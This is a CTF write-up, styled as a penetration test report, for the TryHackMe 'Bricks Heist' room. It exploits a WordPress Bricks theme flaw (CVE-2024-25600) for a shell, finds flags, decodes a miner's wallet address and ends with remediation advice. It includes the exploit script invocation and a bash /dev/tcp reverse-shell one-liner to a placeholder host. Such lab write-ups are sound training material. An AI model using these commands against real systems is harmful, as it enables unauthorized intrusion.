# Security Assessment Report – Bricks Heist (TryHackMe)

**Analyst:** Felipe Campolina  
**Role:** Cybersecurity Analyst / Penetration Tester  
**Date:** August 2025  
**Platform:** TryHackMe  
**Difficulty:** Medium  
**Challenge URL:** https://tryhackme.com/room/tryhack3mbricksheist 

---

## Executive Summary

This report documents a penetration test of the "Bricks Heist" challenge from TryHackMe. The objective was to exploit a WordPress-based web server to uncover hidden flags and identify a suspicious mining service.

**Key Findings:**
- **Critical:** WordPress theme vulnerability (CVE-2024-25600)
- **High:** Hardcoded credentials in wp-config.php
- **Medium:** Suspicious mining service with encoded wallet address

**Environment:** Simulated Lab (TryHackMe Platform)  
**Target IP:** `10.10.39.101` (fictional for demonstration)

---

## Objective

The goal of this penetration test was to simulate a real-world attack scenario. Main objectives included:

- Enumerating WordPress vulnerabilities.
- Exploiting the system to gain shell access.
- Identifying suspicious services and wallet addresses.
- Extracting hidden flags.

---

## 1. Initial Reconnaissance

Performed a full TCP scan using `nmap`:

```bash
nmap -A 10.10.39.101
```

**Findings:**
- Port `22/tcp`: OpenSSH 8.2p1 (Ubuntu)
- Port `80/tcp`: Python HTTP server
- Port `443/tcp`: Apache HTTP server with WordPress 6.5
- Port `3306/tcp`: MySQL (unauthorized access)

---

## 2. WordPress Enumeration

### Directory and File Enumeration

Began by analyzing `/robots.txt`, which revealed a disallowed `/wp-admin/` directory—an indicator of a WordPress installation. To enumerate plugins, themes, and potential vulnerabilities, ran `wpscan` against the target:

```bash
wpscan --url https://bricks.thm --disable-tls-checks
```

**Why this step was important:**  
Identifying the active WordPress theme and its version is crucial for vulnerability assessment. `wpscan` detected the "Bricks" theme in use:

```
[+] WordPress theme in use: bricks
 | Location: https://bricks.thm/wp-content/themes/bricks/
 | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
 | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
 | Style Name: Bricks
 | Style URI: https://bricksbuilder.io/
 | Description: Visual website builder for WordPress....
 | Author: Bricks
 | Author URI: https://bricksbuilder.io/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.9.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'
```

By confirming the theme and version, I could research known vulnerabilities (such as CVE-2024-25600) specific to "Bricks" 1.9.5. This targeted approach increases the likelihood of successful exploitation and reduces noise from irrelevant findings.

**Key Discovery:** WordPress theme vulnerability (CVE-2024-25600).

---

## 3. Exploitation

### Exploiting WordPress Theme Vulnerability

Cloned a public repository containing an exploit script for CVE-2024-25600. Executed the script to gain a reverse shell:

```bash
python3 CVE-2024-25600.py --url https://bricks.thm --callback [YOUR_IP]:[YOUR_PORT]
```

**Result:** Shell access as `apache`.

---

## 4. Flag Retrieval and Shell Stabilization

### First Flag

Located the first flag in the web directory:

```bash
cat /var/www/html/650c844110baced87e1606453b93f22a.txt
# Output: THM{fl46_650c844110baced87e1606453b93f22a}
```

### Shell Stabilization

Upgraded to a stable shell using `bash`:

```bash
bash -c 'exec bash -i &>/dev/tcp/[YOUR_IP]/[YOUR_PORT] <&1'
```

---

## 5. Suspicious Service Analysis

### Identifying the Service

Listed running services to identify the suspicious one:

```bash
systemctl list-units --type=service --state=running
```

**Finding:** A service with "TRYHACK3M" in its description.

### Service Configuration

Examined the service configuration file:

```bash
cat /lib/NetworkManager/inet.conf
```

**Result:** Encoded wallet address found.

---

## 6. Wallet Address Decoding

Decoded the wallet address using CyberChef:

**Encoded:**  
`5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d`

**Decoded Wallet Address:**  
`bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`

---

## 7. Threat Group Identification

Searched for the wallet address in blockchain explorers and identified the associated threat group as **LockBit**.

---

## Summary of Findings

| Step                  | Technique Used                  | Result                          |
| --------------------- | ------------------------------- | ------------------------------- |
| Reconnaissance        | `nmap`, `wpscan`               | Identified WordPress vulnerability |
| Exploitation          | CVE-2024-25600 exploit         | Gained shell access             |
| Flag Retrieval        | File enumeration               | Extracted first flag            |
| Service Analysis      | `systemctl`, `cat`             | Found encoded wallet address    |
| Decoding              | CyberChef                      | Decoded wallet address          |
| Threat Attribution    | Blockchain analysis            | Identified LockBit group        |

---

## Comprehensive Vulnerability Assessment

| **Vulnerability** | **Classification** | **Risk Level** | **CVSS Score** | **Impact** |
|-------------------|-------------------|----------------|----------------|------------|
| WordPress Theme Vulnerability | CVE-2024-25600 | Critical | 9.8 | Remote Code Execution |
| Hardcoded Credentials | CWE-798 | High | 8.2 | Sensitive Data Exposure |
| Suspicious Service | CWE-200 | Medium | 5.3 | Information Disclosure |

---

## Remediation Recommendations

### Immediate Actions (Critical Priority)

1. **Patch WordPress Theme**
   - Update to the latest version.
   - Regularly monitor for vulnerabilities.

2. **Secure Configuration Files**
   - Remove hardcoded credentials from `wp-config.php`.
   - Use environment variables for sensitive data.

3. **Audit Services**
   - Investigate and remove unauthorized services.
   - Monitor for suspicious activity.

### Long-term Security Improvements

1. **Web Application Security**
   - Implement a Web Application Firewall (WAF).
   - Regularly scan for vulnerabilities.

2. **System Hardening**
   - Restrict access to sensitive directories.
   - Apply principle of least privilege.

---

## Conclusion

This assessment demonstrated a complete attack chain against the "Bricks Heist" challenge, highlighting the importance of securing WordPress installations and monitoring for unauthorized services. The vulnerabilities exploited in this challenge are common in real-world environments, emphasizing the need for proactive security measures.

**Challenge Rating:** ⭐⭐⭐⭐ (Great for intermediate-level penetration testers)

---
